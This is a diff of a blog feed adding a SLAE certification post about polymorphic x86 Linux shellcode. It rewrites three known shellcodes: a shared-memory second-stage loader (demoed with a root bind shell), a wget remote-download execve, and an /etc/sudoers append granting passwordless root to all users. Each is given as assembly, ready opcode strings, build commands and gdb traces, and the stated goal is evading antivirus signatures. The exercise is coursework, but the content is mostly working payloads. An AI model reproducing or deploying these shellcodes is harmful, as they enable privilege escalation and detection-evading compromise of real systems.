@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Slae | tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/blog/categories/slae/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2018-07-21T09:18:11+00:00</updated>
+  <updated>2018-08-15T20:06:17+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -12,6 +12,754 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SLAE 0x06: Polymorphic Shellcodes]]></title>
+    <link href="http://tcunha.github.io/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/"/>
+    <updated>2018-07-28T08:20:29+00:00</updated>
+    <id>http://tcunha.github.io/blog/2018/07/28/slae-0x06-polymorphic-shellcodes</id>
+    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>The sixth exercise consisted of choosing 3 linux/x86 shellcodes from <a href="http://shell-storm.org/shellcode/">shell-storm.org</a> and polymorphically alter them. The resulting shellcode should have at the most 150% the size of the original one.</p>
+
+<p>This technique is useful for bypassing anti-virus engines where common operations are fingerprinted and blacklisted. By modifying a shellcode with semantically equivalent instructions, the shellcode will be harder to detect.</p>
+
+<h3>1. Shared memory exec (369)</h3>
+
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-369.php">This</a> shellcode consists of attaching to a shared memory region and executing the in memory shellcode. It&rsquo;s initial size is <strong>50 bytes</strong>, therefore its polymorphic code must be <strong>75 bytes</strong> maximum, according to the requirements.</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    xor edi, edi
+    xor esi, esi
+    xor edx, edx
+
+    mov ecx, 0xdeadbeef     ; key
+    xor ebx, ebx
+    mov bl, 0x17            ; shmget
+    ; edx is already zero from the above
+    ; esi is already zero frm the above
+    xor eax, eax
+    mov al, 0x75
+    ; int ipc(unsigned int, int, int, int, void *, long)
+    int 0x80
+
+    xor edi, edi
+    mov esi, 0xbffffffa     ; address
+    xor edx, edx
+    mov ecx, eax            ; move shm id returned by the shmget above
+    xor ebx, ebx
+    mov bl, 0x15            ; shmat
+    xor eax, eax
+    mov al, 0x75
+    ; int ipc(unsigned int, int, int, int, void *, long)
+    int 0x80
+
+    ; push logical address to the stack and jump to it after the ret
+    mov eax, 0xbffffffa
+    push dword [eax]
+    ret
+</code></pre>
+
+<p>The above original shellcode will obtain the identifier associated with the provided shared memory key, attach to it and jump to the in memory executable code, if any.</p>
+
+<p>This is using the <a href="http://man7.org/linux/man-pages/man2/ipc.2.html">ipc(2)</a> system call, where like <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a>, its first argument is the IPC function to invoke. However, unlike the socket system calls which are now exported on x86, the IPC ones aren&rsquo;t.</p>
+
+<p>Its <a href="https://github.com/torvalds/linux/blob/716a685fdb89942a50c4138141027e38336a895f/ipc/syscall.c#L81">fourth parameter</a> (third in the prototype) is a user-provided logical address pointer where the contents of the shared memory can be accessed.</p>
+
+<pre><code class="c ipc(2) prototype">int ipc(unsigned int call, int first, int second, int third, void *ptr, long fifth);
+</code></pre>
+
+<pre><code class="bash retrieving the system call number and constants">$ asm-syscall ipc
+#define __NR_ipc 117
+0x75
+$ grep SHM /usr/include/linux/ipc.h
+#define SHMAT           21
+#define SHMDT           22
+#define SHMGET          23
+#define SHMCTL          24
+</code></pre>
+
+<p>The registers for the two <a href="http://man7.org/linux/man-pages/man2/ipc.2.html">ipc(2)</a> system calls will, then, have the following respective values:</p>
+
+<pre><code>+----------+---------------+
+| register |     value     |
++----------+---------------+
+| eax      | 117           |
+| ebx      | 23            | &lt;== shmget(2)
+| ecx      | 0xdeafbeef    |
+| edx      | 0             | &lt;== size is specified by the creator
+| esi      | 0             | &lt;== so are the flags
+| edi      | 0             |
+| ebp      | 0             |
++----------+---------------+
+| return   | id            |
++----------+---------------+
+
++----------+---------------+
+| register |     value     |
++----------+---------------+
+| eax      | 117           |
+| ebx      | 21            | &lt;== shmat(2)
+| ecx      | shmget(2) id  |
+| edx      | 0             | &lt;== flags
+| esi      | address       |
+| edi      | 0             |
+| ebp      | 0             |
++----------+---------------+
+</code></pre>
+
+<p>Initially, couldn&rsquo;t get it to work due to the hard-coded shared memory logical address. Substituting it with the current logical address of the stack allows to correctly read the contents off the shared memory.</p>
+
+<p>The below polymorphic shellcode also gets the shared memory key by negating its initial value and performing logic and mathematical operations on the registers and is 11 bytes smaller than the original:</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    xor eax, eax
+    cdq                     ; make edx zero, as well
+
+    ; ipc(2) has a bunch of parameters, zero them all
+    lea ebx, [eax]
+    and esi, ebx
+    sub edi, edi
+    xor ebp, ebp
+
+    mov ecx, 0x35014542     ; key in two's complement
+    neg ecx                 ; key
+    add bl, 0x17            ; shmget (ebx is already zero)
+    ; edx, esi and ebp are already zero from the above
+    or al, 0x75             ; eax is already zero
+    ; int ipc(unsigned int, int, int, int, void *, long)
+    int 0x80
+
+    mov esi, esp            ; use stack logical address
+    mov ecx, eax            ; move shm id returned by the shmget above
+    dec ebx
+    dec ebx                 ; shmat (0x2 less than shmget)
+    ; edx, esi and ebp are already zero from the above
+    and eax, ebp            ; make it zero
+    add al, 0x75
+    ; int ipc(unsigned int, int, int, int, void *, long)
+    int 0x80
+
+    jmp [esi]               ; finally jump to the second stage shellcode
+</code></pre>
+
+<p>Just like with the egghunter exercise, a custom second stage shellcode can be specified via the <strong>STAGE2</strong> variable, which will be copied to the shared memory region:</p>
+
+<pre><code class="bash">$ make PROG=369 STAGE2=../0x01-bind/bind
+nasm  -f elf32 -o 369.o 369.asm
+ld -N -zexecstack -o 369 369.o
+08048080 &lt;_start&gt;:
+ 8048080:       31 c0                   xor    eax,eax
+ 8048082:       99                      cdq
+ 8048083:       8d 18                   lea    ebx,[eax]
+ 8048085:       21 de                   and    esi,ebx
+ 8048087:       29 ff                   sub    edi,edi
+ 8048089:       31 ed                   xor    ebp,ebp
+ 804808b:       b9 42 45 01 35          mov    ecx,0x35014542
+ 8048090:       f7 d9                   neg    ecx
+ 8048092:       80 c3 17                add    bl,0x17
+ 8048095:       0c 75                   or     al,0x75
+ 8048097:       cd 80                   int    0x80
+ 8048099:       89 e6                   mov    esi,esp
+ 804809b:       89 c1                   mov    ecx,eax
+ 804809d:       4b                      dec    ebx
+ 804809e:       4b                      dec    ebx
+ 804809f:       21 e8                   and    eax,ebp
+ 80480a1:       04 75                   add    al,0x75
+ 80480a3:       cd 80                   int    0x80
+ 80480a5:       ff 26                   jmp    DWORD PTR [esi]
+Shellcode size: 39
+\x31\xc0\x99\x8d\x18\x21\xde\x29\xff\x31\xed\xb9\x42\x45\x01\x35\xf7\xd9\x80\xc3\x17\x0c\x75\xcd\x80\x89\xe6\x89\xc1\x4b\x4b\x21\xe8\x04\x75\xcd\x80\xff\x26
+cc -DSHELLCODE=`asm-opcodes 369` -DSTAGE2=`asm-opcodes ../0x01-bind/bind` -W -Wall -fno-stack-protector -zexecstack -o shellcode 369.c
+</code></pre>
+
+<pre><code class="c">#include &lt;sys/shm.h&gt;
+
+#include &lt;err.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#define QUOTE(s)        #s
+#define SHM_SIZE        512
+#define STR(s)          QUOTE(s)
+
+unsigned char shellcode[] = STR(SHELLCODE);
+unsigned char stage2[] = STR(STAGE2);
+
+int
+main(void)
+{
+    int      shmid;
+    void    *addr;
+
+    if ((shmid = shmget(0xcafebabe, SHM_SIZE, 0644|IPC_CREAT)) == -1)
+        err(1, "shmget");
+    if ((addr = shmat(shmid, NULL, 0)) == (void *) -1)
+        err(1, "shmat");
+    memcpy(addr, stage2, SHM_SIZE);
+
+    printf("Shellcode length: %zu\n", sizeof shellcode - 1);
+    (*(void(*)(void)) shellcode)();
+
+    return (0);
+}
+</code></pre>
+
+<p>Breaking just before the jmp call, the contents of the second stage shellcode are correctly referenced:</p>
+
+<pre><code class="bash">(gdb) b *0x00402085
+Breakpoint 2 at 0x402085
+(gdb) continue
+Continuing.
+Dump of assembler code for function shellcode:
+   0x00402060 &lt;+0&gt;:     xor    eax,eax
+   0x00402062 &lt;+2&gt;:     cdq
+   0x00402063 &lt;+3&gt;:     lea    ebx,[eax]
+   0x00402065 &lt;+5&gt;:     and    esi,ebx
+   0x00402067 &lt;+7&gt;:     sub    edi,edi
+   0x00402069 &lt;+9&gt;:     xor    ebp,ebp
+   0x0040206b &lt;+11&gt;:    mov    ecx,0x35014542
+   0x00402070 &lt;+16&gt;:    neg    ecx
+   0x00402072 &lt;+18&gt;:    add    bl,0x17
+   0x00402075 &lt;+21&gt;:    or     al,0x75
+   0x00402077 &lt;+23&gt;:    int    0x80
+   0x00402079 &lt;+25&gt;:    mov    esi,esp
+   0x0040207b &lt;+27&gt;:    mov    ecx,eax
+   0x0040207d &lt;+29&gt;:    dec    ebx
+   0x0040207e &lt;+30&gt;:    dec    ebx
+   0x0040207f &lt;+31&gt;:    and    eax,ebp
+   0x00402081 &lt;+33&gt;:    add    al,0x75
+   0x00402083 &lt;+35&gt;:    int    0x80
+=&gt; 0x00402085 &lt;+37&gt;:    jmp    DWORD PTR [esi]
+   0x00402087 &lt;+39&gt;:    add    BYTE PTR [eax],al
+End of assembler dump.
+$2 = [ IF ]
+
+Breakpoint 2, 0x00402085 in shellcode ()
+(gdb) i r esi
+esi            0xbffff62c       -1073744340
+(gdb) x/10i *$esi
+   0xb7fd2000:  xor    eax,eax
+   0xb7fd2002:  xor    esi,esi
+   0xb7fd2004:  cdq
+   0xb7fd2005:  mov    ax,0x167
+   0xb7fd2009:  push   0x2
+   0xb7fd200b:  pop    ebx
+   0xb7fd200c:  push   0x1
+   0xb7fd200e:  pop    ecx
+   0xb7fd200f:  int    0x80
+   0xb7fd2011:  xchg   ebx,eax
+</code></pre>
+
+<pre><code class="bash"># ./shellcode
+Shellcode length: 39
+Second stage length: 82
+$ ss -nlt|grep 4242
+LISTEN     0      0            *:4242                     *:*
+$ nc -v 127.0.0.1 4242
+Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<h3>2. Remote file download (611)</h3>
+
+<p>The objective of <a href="http://shell-storm.org/shellcode/files/shellcode-611.php">this</a> one consists in calling /usr/bin/wget via <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> and fetch the remote <strong>aaaa</strong> resource. It&rsquo;s size is <strong>42 bytes</strong>, meaning that its morphed code must be at the most <strong>63 bytes</strong>.</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    push byte +0xb
+    pop eax
+    ; int execve(const char *, char *const [], char *const [])
+    cdq                     ; set edx to zero, as well
+
+    push edx                ; push the terminating nul byte
+    push dword 0x61616161   ; aaaa
+    mov ecx, esp            ; save address of arguments
+    push edx                ; push the terminating nul byte
+    push byte +0x74         ; t
+    push dword 0x6567772f   ; /wge
+    push dword 0x6e69622f   ; /bin
+    push dword 0x7273752f   ; /usr
+    mov ebx, esp            ; filename
+    push edx                ; push the terminating nul byte
+    push ecx                ; push the address of the arguments
+    push ebx                ; push the address of the filename
+    mov ecx, esp            ; argv
+    ; edx is already zero from the above cdq instruction
+    int 0x80
+
+    inc eax
+    int 0x80
+</code></pre>
+
+<p>Trying to execute it does, indeed, fetch the remote resource. In the modified shellcode I&rsquo;ve opted to remove the last two instructions, since if the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call fails -1 is returned, thus incrementing eax would make the code call <a href="http://man7.org/linux/man-pages/man2/restart_syscall.2.html">restart_syscall(2)</a>.</p>
+
+<pre><code class="bash">$ ./611
+--2018-08-08 22:00:10--  http://aaaa/
+Resolving aaaa (aaaa)... failed: Name or service not known.
+wget: unable to resolve host address 'aaaa'
+</code></pre>
+
+<p>To save space, pointer arithmeric operations on stack values are performed with the ebp register, instead of with esp. The offsets are, also, statically calculated by the code. The resulting morphed shellcode is 21 bytes bigger, making it the maximum 63 bytes allowed by the requirements:</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    push 0xffffffff
+    pop eax
+    neg eax
+    add al, 0xa                     ; make it 0xb
+    ; int execve(const char *, char *const [], char *const [])
+    cdq                             ; make edx zero, as well
+
+    ; make the base pointer the same as the current stack pointer, since
+    ; operations with pointers are one byte smaller with the former
+    mov ebp, esp
+
+    push edx                        ; nul character
+    push 0x61616161                 ; fetch this resource
+
+    push edx                        ; nul character
+    push edx                        ; the stack might be full of garbage
+    mov byte [ebp - 0x10], 0x74     ; overwrite LSB with a t
+    ; no need to sub the stack pointer here, only the current double word
+    ; LSB was changed
+
+    push 0xcaceee5e
+    ror dword [esp], 0x1            ; /wge
+    push 0xdcd2c45e
+    ror dword [esp], 0x1            ; /bin
+    push 0xe4e6ea5e
+    ror dword [esp], 0x1            ; /usr
+
+    push esp
+    pop ebx                         ; filename
+    lea ecx, [ebp - 0x8]            ; save a pointer to the arguments
+
+    push edx
+    mov dword [ebp - 0x24], ecx     ; save the pointer to the arguments
+    mov dword [ebp - 0x28], ebx     ; save the pointer to the command
+    lea ecx, [ebp - 0x28]           ; argv
+
+    ; edx is already zero by the above cdq instruction
+    int 0x80
+</code></pre>
+
+<p>The stack and registers before the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call will have the following layout and values, as it can be seen from the gdb output:</p>
+
+<pre><code>+------------+
+|   random   | &lt;==== ebp
++------------+
+| 0x00000000 | &lt;==== ebp - 0x04
++------------+
+| 0x61616161 | &lt;==== ebp - 0x08 (ecx)
++------------+
+| 0x00000000 | &lt;==== ebp - 0x0c
++------------+
+| 0x00000074 | &lt;==== ebp - 0x10
++------------+
+| 0x6567772f | &lt;==== ebp - 0x14
++------------+
+| 0x6e69622f | &lt;==== ebp - 0x18
++------------+
+| 0x7273752f | &lt;==== ebp - 0x1c (ebx)
++------------+
+| 0x00000000 | &lt;==== ebp - 0x20
++------------+
+|  ecx  ptr  | &lt;==== ebp - 0x24
++------------+
+|  ebx  ptr  | &lt;==== ebp - 0x28 (ecx)
++------------+
+</code></pre>
+
+<pre><code>(gdb) b *0x0040207d
+Breakpoint 2 at 0x40207d
+(gdb) continue
+Continuing.
+Dump of assembler code for function shellcode:
+   0x00402040 &lt;+0&gt;:     push   0xffffffff
+   0x00402042 &lt;+2&gt;:     pop    eax
+   0x00402043 &lt;+3&gt;:     neg    eax
+   0x00402045 &lt;+5&gt;:     add    al,0xa
+   0x00402047 &lt;+7&gt;:     cdq
+   0x00402048 &lt;+8&gt;:     mov    ebp,esp
+   0x0040204a &lt;+10&gt;:    push   edx
+   0x0040204b &lt;+11&gt;:    push   0x61616161
+   0x00402050 &lt;+16&gt;:    push   edx
+   0x00402051 &lt;+17&gt;:    push   edx
+   0x00402052 &lt;+18&gt;:    mov    BYTE PTR [ebp-0x10],0x74
+   0x00402056 &lt;+22&gt;:    push   0xcaceee5e
+   0x0040205b &lt;+27&gt;:    ror    DWORD PTR [esp],1
+   0x0040205e &lt;+30&gt;:    push   0xdcd2c45e
+   0x00402063 &lt;+35&gt;:    ror    DWORD PTR [esp],1
+   0x00402066 &lt;+38&gt;:    push   0xe4e6ea5e
+   0x0040206b &lt;+43&gt;:    ror    DWORD PTR [esp],1
+   0x0040206e &lt;+46&gt;:    push   esp
+   0x0040206f &lt;+47&gt;:    pop    ebx
+   0x00402070 &lt;+48&gt;:    lea    ecx,[ebp-0x8]
+   0x00402073 &lt;+51&gt;:    push   edx
+   0x00402074 &lt;+52&gt;:    mov    DWORD PTR [ebp-0x24],ecx
+   0x00402077 &lt;+55&gt;:    mov    DWORD PTR [ebp-0x28],ebx
+   0x0040207a &lt;+58&gt;:    lea    ecx,[ebp-0x28]
+=&gt; 0x0040207d &lt;+61&gt;:    int    0x80
+   0x0040207f &lt;+63&gt;:    add    BYTE PTR [eax],al
+End of assembler dump.
+$50 = [ IF OF ]
+0x0040207d in shellcode ()
+(gdb) x/10w $esp - 8
+0xbffff624:     0xbffff630      0xbffff644      0x00000000      0x7273752f
+0xbffff634:     0x6e69622f      0x6567772f      0x00000074      0x00000000
+0xbffff644:     0x61616161      0x00000000
+(gdb) x/s 0xbffff630
+0xbffff630:     "/usr/bin/wget"
+(gdb) x/s 0xbffff644
+0xbffff644:     "aaaa"
+</code></pre>
+
+<pre><code class="bash">$ make PROG=611
+nasm  -f elf32 -o 611.o 611.asm
+ld -N -zexecstack -o 611 611.o
+08048080 &lt;_start&gt;:
+ 8048080:       6a ff                   push   0xffffffff
+ 8048082:       58                      pop    eax
+ 8048083:       f7 d8                   neg    eax
+ 8048085:       04 0a                   add    al,0xa
+ 8048087:       99                      cdq
+ 8048088:       89 e5                   mov    ebp,esp
+ 804808a:       52                      push   edx
+ 804808b:       68 61 61 61 61          push   0x61616161
+ 8048090:       52                      push   edx
+ 8048091:       52                      push   edx
+ 8048092:       c6 45 f0 74             mov    BYTE PTR [ebp-0x10],0x74
+ 8048096:       68 5e ee ce ca          push   0xcaceee5e
+ 804809b:       d1 0c 24                ror    DWORD PTR [esp],1
+ 804809e:       68 5e c4 d2 dc          push   0xdcd2c45e
+ 80480a3:       d1 0c 24                ror    DWORD PTR [esp],1
+ 80480a6:       68 5e ea e6 e4          push   0xe4e6ea5e
+ 80480ab:       d1 0c 24                ror    DWORD PTR [esp],1
+ 80480ae:       54                      push   esp
+ 80480af:       5b                      pop    ebx
+ 80480b0:       8d 4d f8                lea    ecx,[ebp-0x8]
+ 80480b3:       52                      push   edx
+ 80480b4:       89 4d dc                mov    DWORD PTR [ebp-0x24],ecx
+ 80480b7:       89 5d d8                mov    DWORD PTR [ebp-0x28],ebx
+ 80480ba:       8d 4d d8                lea    ecx,[ebp-0x28]
+ 80480bd:       cd 80                   int    0x80
+Shellcode size: 63
+\x6a\xff\x58\xf7\xd8\x04\x0a\x99\x89\xe5\x52\x68\x61\x61\x61\x61\x52\x52\xc6\x45\xf0\x74\x68\x5e\xee\xce\xca\xd1\x0c\x24\x68\x5e\xc4\xd2\xdc\xd1\x0c\x24\x68\x5e\xea\xe6\xe4\xd1\x0c\x24\x54\x5b\x8d\x4d\xf8\x52\x89\x4d\xdc\x89\x5d\xd8\x8d\x4d\xd8\xcd\x80
+cc -DSHELLCODE=`asm-opcodes 611` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
+</code></pre>
+
+<pre><code class="bash">$ ./shellcode
+Shellcode length: 63
+--2018-08-08 23:02:04--  http://aaaa/
+Resolving aaaa (aaaa)... failed: Name or service not known.
+wget: unable to resolve host address 'aaaa'
+</code></pre>
+
+<h3>3. Edit /etc/sudoers for full access (62)</h3>
+
+<p>The final <a href="http://shell-storm.org/shellcode/files/shellcode-62.php">one</a> grants root access to every single user on the machine. It&rsquo;s size is <strong>86 bytes</strong>, meaning that the altered shellcode should be at the most <strong>129 bytes</strong>.</p>
+
+<pre><code class="asm">global _start
+
+section .text:
+_start:
+    xor eax, eax
+    push eax                        ; nul character
+    push dword 0x7372656f           ; oers
+    push dword 0x6475732f           ; /sud
+    push dword 0x6374652f           ; /etc
+    mov ebx, esp                    ; pathname
+    mov cx, 0x401                   ; flags (O_WRONLY | O_APPEND)
+    mov al, 0x5
+    ; int open(const char *, int)
+    int 0x80
+
+    mov ebx, eax                    ; move new file descriptor
+    xor eax, eax
+    push eax                        ; nul character
+    push dword 0xa4c4c41            ; ALL
+    push dword 0x203a4457           ; WD:
+    push dword 0x53534150           ; PASS
+    push dword 0x4f4e2029           ; ) NO
+    push dword 0x4c4c4128           ; (ALL
+    push dword 0x3d4c4c41           ; ALL=
+    push dword 0x204c4c41           ; ALL
+    mov ecx, esp                    ; buf
+    mov dl, 0x1c                    ; count
+    mov al, 0x4
+    ; ssize_t write(int, const void *, size_t)
+    int 0x80
+
+    mov al, 0x6
+    ; int close(int)
+    int 0x80
+
+    xor ebx,ebx
+    mov al, 0x1
+    ; int exit(int)
+    int 0x80
+</code></pre>
+
+<p>Decided to drop the <a href="http://man7.org/linux/man-pages/man2/close.2.html">close(2)</a> and <a href="http://man7.org/linux/man-pages/man3/exit.3.html">exit(2)</a> system calls since they don&rsquo;t bring any advantages whatsoever and moreover, prunning them allowed to focus more on MMX, FPU and SSE instructions. The total size of the morphed code is 128 bytes:</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    push esp
+    ; make the base pointer the same as the current stack pointer, since
+    ; operations with pointers are one byte smaller with the former
+    pop ebp
+
+    xor eax, eax
+    cdq                             ; make edx zero, too
+
+    push 0xcafebabe                 ; initial xor value
+    push edx                        ; nul character
+    push 0xb98cdfd1
+    push 0x17071640
+    movd mm0, [ebp - 0x4]           ; load initial xor value
+    pxor mm0, [ebp - 0xc]           ; oers
+    movd [ebp - 0xc], mm0           ; overwrite result on the stack
+    pxor mm0, [ebp - 0x10]          ; /sud (xor with the previous result)
+    movd [ebp - 0x10], mm0          ; overwrite result on the stack
+    emms                            ; done with mmx, switch to x87
+    push 0x6374652e                 ; .etc
+    mov ebx, esp                    ; pathname
+    inc byte [ebx]                  ; make the first character a slash
+    push 0x20
+    fild dword [esp]                ; load current value on the stack
+    fmul st0                        ; multiply by itself
+    fist dword [esp]                ; overwrite value on the stack
+    pop ecx
+    inc ecx                         ; flags (O_WRONLY | O_APPEND)
+    or al, 0x5
+    ; int open(const char *, int)
+    int 0x80
+
+    xchg ebx, eax                   ; move new file descriptor
+    push edx                        ; nul character
+    push 0x0a4c4c41                 ; ALL
+    push 0x203a4457                 ; WD:
+    push 0x53534150                 ; PASS
+    push 0x4f4e2029                 ; ) NO
+    push 0x4c4c4128                 ; (ALL
+    push 0x3d4c4c41                 ; ALL=
+    push 0x204c4c41                 ; ALL
+    mov ecx, esp                    ; buf
+    or dl, 0x1c                     ; count (28 bytes)
+    push 0x2
+    movss xmm0, [esp]
+    addss xmm0, [esp]
+    movd eax, xmm0
+    ; ssize_t write(int, const void *, size_t)
+    int 0x80
+</code></pre>
+
+<p>To partially build the filename, the MMX XOR functions were used with an initial XOR value. The resulting value serves as the XOR value to the next one:</p>
+
+<pre><code>0xcafebabe ^ 0xb98cdfd1 = 0x7372656f ^ 0x17071640 = 0x6475732f
+</code></pre>
+
+<p>Following that, the <a href="https://c9x.me/x86/html/file_module_x86_id_77.html">emms</a> instruction is issued to signal the CPU that MMX operations are done and the shared registers are going to be used by the x87 FPU, which is going to be needed by the <a href="https://c9x.me/x86/html/file_module_x86_id_104.html">fmul</a> instruction to calculate the flags for the <a href="http://man7.org/linux/man-pages/man2/open.2.html">open(2)</a> system call:</p>
+
+<pre><code>O_WRONLY | O_APPEND = 0x401 = (0x20 * 0x20) + 0x1
+</code></pre>
+
+<pre><code class="bash">$ make PROG=62
+nasm  -f elf32 -o 62.o 62.asm
+ld -N -zexecstack -o 62 62.o
+08048080 &lt;_start&gt;:
+ 8048080:       54                      push   esp
+ 8048081:       5d                      pop    ebp
+ 8048082:       31 c0                   xor    eax,eax
+ 8048084:       99                      cdq
+ 8048085:       68 be ba fe ca          push   0xcafebabe
+ 804808a:       52                      push   edx
+ 804808b:       68 d1 df 8c b9          push   0xb98cdfd1
+ 8048090:       68 40 16 07 17          push   0x17071640
+ 8048095:       0f 6e 45 fc             movd   mm0,DWORD PTR [ebp-0x4]
+ 8048099:       0f ef 45 f4             pxor   mm0,QWORD PTR [ebp-0xc]
+ 804809d:       0f 7e 45 f4             movd   DWORD PTR [ebp-0xc],mm0
+ 80480a1:       0f ef 45 f0             pxor   mm0,QWORD PTR [ebp-0x10]
+ 80480a5:       0f 7e 45 f0             movd   DWORD PTR [ebp-0x10],mm0
+ 80480a9:       0f 77                   emms
+ 80480ab:       68 2e 65 74 63          push   0x6374652e
+ 80480b0:       89 e3                   mov    ebx,esp
+ 80480b2:       fe 03                   inc    BYTE PTR [ebx]
+ 80480b4:       6a 20                   push   0x20
+ 80480b6:       db 04 24                fild   DWORD PTR [esp]
+ 80480b9:       d8 c8                   fmul   st,st(0)
+ 80480bb:       db 14 24                fist   DWORD PTR [esp]
+ 80480be:       59                      pop    ecx
+ 80480bf:       41                      inc    ecx
+ 80480c0:       0c 05                   or     al,0x5
+ 80480c2:       cd 80                   int    0x80
+ 80480c4:       93                      xchg   ebx,eax
+ 80480c5:       52                      push   edx
+ 80480c6:       68 41 4c 4c 0a          push   0xa4c4c41
+ 80480cb:       68 57 44 3a 20          push   0x203a4457
+ 80480d0:       68 50 41 53 53          push   0x53534150
+ 80480d5:       68 29 20 4e 4f          push   0x4f4e2029
+ 80480da:       68 28 41 4c 4c          push   0x4c4c4128
+ 80480df:       68 41 4c 4c 3d          push   0x3d4c4c41
+ 80480e4:       68 41 4c 4c 20          push   0x204c4c41
+ 80480e9:       89 e1                   mov    ecx,esp
+ 80480eb:       80 ca 1c                or     dl,0x1c
+ 80480ee:       6a 02                   push   0x2
+ 80480f0:       f3 0f 10 04 24          movss  xmm0,DWORD PTR [esp]
+ 80480f5:       f3 0f 58 04 24          addss  xmm0,DWORD PTR [esp]
+ 80480fa:       66 0f 7e c0             movd   eax,xmm0
+ 80480fe:       cd 80                   int    0x80
+Shellcode size: 128
+\x54\x5d\x31\xc0\x99\x68\xbe\xba\xfe\xca\x52\x68\xd1\xdf\x8c\xb9\x68\x40\x16\x07\x17\x0f\x6e\x45\xfc\x0f\xef\x45\xf4\x0f\x7e\x45\xf4\x0f\xef\x45\xf0\x0f\x7e\x45\xf0\x0f\x77\x68\x2e\x65\x74\x63\x89\xe3\xfe\x03\x6a\x20\xdb\x04\x24\xd8\xc8\xdb\x14\x24\x59\x41\x0c\x05\xcd\x80\x93\x52\x68\x41\x4c\x4c\x0a\x68\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41\x4c\x4c\x20\x89\xe1\x80\xca\x1c\x6a\x02\xf3\x0f\x10\x04\x24\xf3\x0f\x58\x04\x24\x66\x0f\x7e\xc0\xcd\x80
+cc -DSHELLCODE=`asm-opcodes 62` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
+</code></pre>
+
+<pre><code class="bash">(gdb) i r mm0
+mm0            {uint64 = 0x7372656f, v2_int32 = {0x7372656f, 0x0}, v4_int16 = {0x656f, 0x7372, 0x0, 0x0}, v8_int8 = {0x6f, 0x65, 0x72, 0x73, 0x0, 0x0, 0x0, 0x0}}
+(gdb) x/s $ebp-0xc
+0xbffff640:     "oers"
+(gdb) continue
+Continuing.
+Dump of assembler code for function shellcode:
+   0x00402040 &lt;+0&gt;:     push   esp
+   0x00402041 &lt;+1&gt;:     pop    ebp
+   0x00402042 &lt;+2&gt;:     xor    eax,eax
+   0x00402044 &lt;+4&gt;:     cdq
+   0x00402045 &lt;+5&gt;:     push   0xcafebabe
+   0x0040204a &lt;+10&gt;:    push   edx
+   0x0040204b &lt;+11&gt;:    push   0xb98cdfd1
+   0x00402050 &lt;+16&gt;:    push   0x17071640
+   0x00402055 &lt;+21&gt;:    movd   mm0,DWORD PTR [ebp-0x4]
+   0x00402059 &lt;+25&gt;:    pxor   mm0,QWORD PTR [ebp-0xc]
+   0x0040205d &lt;+29&gt;:    movd   DWORD PTR [ebp-0xc],mm0
+   0x00402061 &lt;+33&gt;:    pxor   mm0,QWORD PTR [ebp-0x10]
+   0x00402065 &lt;+37&gt;:    movd   DWORD PTR [ebp-0x10],mm0
+   0x00402069 &lt;+41&gt;:    emms
+   0x0040206b &lt;+43&gt;:    push   0x6374652e
+   0x00402070 &lt;+48&gt;:    mov    ebx,esp
+   0x00402072 &lt;+50&gt;:    inc    BYTE PTR [ebx]
+=&gt; 0x00402074 &lt;+52&gt;:    push   0x20
+   0x00402076 &lt;+54&gt;:    fild   DWORD PTR [esp]
+   0x00402079 &lt;+57&gt;:    fmul   st,st(0)
+   0x0040207b &lt;+59&gt;:    fist   DWORD PTR [esp]
+   0x0040207e &lt;+62&gt;:    pop    ecx
+   0x0040207f &lt;+63&gt;:    inc    ecx
+   0x00402080 &lt;+64&gt;:    or     al,0x5
+   0x00402082 &lt;+66&gt;:    int    0x80
+   0x00402084 &lt;+68&gt;:    xchg   ebx,eax
+   0x00402085 &lt;+69&gt;:    push   edx
+   0x00402086 &lt;+70&gt;:    push   0xa4c4c41
+   0x0040208b &lt;+75&gt;:    push   0x203a4457
+   0x00402090 &lt;+80&gt;:    push   0x53534150
+   0x00402095 &lt;+85&gt;:    push   0x4f4e2029
+   0x0040209a &lt;+90&gt;:    push   0x4c4c4128
+   0x0040209f &lt;+95&gt;:    push   0x3d4c4c41
+   0x004020a4 &lt;+100&gt;:   push   0x204c4c41
+   0x004020a9 &lt;+105&gt;:   mov    ecx,esp
+   0x004020ab &lt;+107&gt;:   or     dl,0x1c
+   0x004020ae &lt;+110&gt;:   push   0x2
+   0x004020b0 &lt;+112&gt;:   movss  xmm0,DWORD PTR [esp]
+   0x004020b5 &lt;+117&gt;:   addss  xmm0,DWORD PTR [esp]
+---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+   0x004020ba &lt;+122&gt;:   movd   eax,xmm0
+   0x004020be &lt;+126&gt;:   int    0x80
+   0x004020c0 &lt;+128&gt;:   add    BYTE PTR [eax],al
+End of assembler dump.
+$22 = [ IF ]
+
+Breakpoint 2, 0x00402074 in shellcode ()
+(gdb) x/s $ebx
+0xbffff638:     "/etc/sudoers"
+(gdb) c
+Continuing.
+Dump of assembler code for function shellcode:
